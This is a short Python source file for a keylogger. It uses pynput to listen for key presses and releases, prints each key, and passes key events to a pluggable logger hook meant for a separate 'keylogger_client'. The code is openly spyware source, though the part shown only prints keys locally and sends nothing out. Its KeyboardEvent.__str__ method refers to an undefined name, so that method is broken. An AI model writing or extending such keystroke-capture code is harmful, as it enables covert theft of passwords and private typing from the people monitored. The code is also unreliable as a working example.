from pynput import keyboard


class Keylogger:

    def __init__(self):
        # another way to define function here logger will be a function which take one argument
        # and always return true we have done this to make an event so when ever a key is pressed
        # an event will fire which will be captured by keylogger_client
        self.logger = lambda x: True
        self.key_pressed = ''

    def on_release(self, key):
        print('{} release'.format(key))
        self.logger(self.key_press_event(key))

    def on_press(self, key):
        try:
            print('{} key pressed'.format(key.char))
        except AttributeError:
            print('{} key pressed'.format(key))

    def switch_key_stoke(self, key):
        switcher = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '\n',
            keyboard.Key.tab: '\t'
        }
        return switcher.get(key, key)

    def key_press_event(self, key):
        keyString = self.switch_key_stoke(key)
        return KeyboardEvent(keyString)

    def start(self):
        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        ) as listener:
            listener.join()


class KeyboardEvent:

    def __init__(self, key):
        self.key = key

    def __str__(self):
        return str(key)
